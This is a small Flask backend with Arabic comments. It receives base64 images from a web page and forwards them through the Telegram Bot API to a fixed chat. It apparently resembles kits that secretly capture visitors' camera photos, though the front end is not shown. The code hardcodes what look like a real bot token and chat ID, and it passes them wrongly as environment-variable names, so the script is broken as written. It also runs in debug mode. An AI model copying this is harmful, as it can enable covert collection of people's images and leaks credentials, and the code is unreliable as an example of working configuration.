from flask import Flask, render_template, request, jsonify
import os
import requests
import base64

app = Flask(__name__)

# 🔐 قراءة التوكن والايدي من متغيرات البيئة
TELEGRAM_BOT_TOKEN = os.environ.get("8354228448:AAF_aDnYtuS__fqolYrWfAKnxh9DvdYCL_Q")
TELEGRAM_CHAT_ID = os.environ.get("7757061458")


# الصفحة الرئيسية
@app.route('/')
def index():
    return render_template('index.html')


# استقبال الصورة وإرسالها إلى تليجرام
@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        image = data.get('image')

        if not image:
            return jsonify({"success": False, "message": "لا توجد صورة"})

        # ✂️ إزالة header من base64
        image_data = image.split(',')[1]
        image_bytes = base64.b64decode(image_data)

        # 🔗 رابط API تليجرام
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

        files = {
            'photo': ('image.png', image_bytes)
        }

        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'caption': '📸 صورة من الموقع'
        }

        # 🚀 إرسال الطلب
        response = requests.post(url, files=files, data=data)

        return jsonify({
            "success": response.status_code == 200,
            "telegram_response": response.text
        })

    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


# تشغيل التطبيق
if __name__ == '__main__':
    app.run(debug=True)
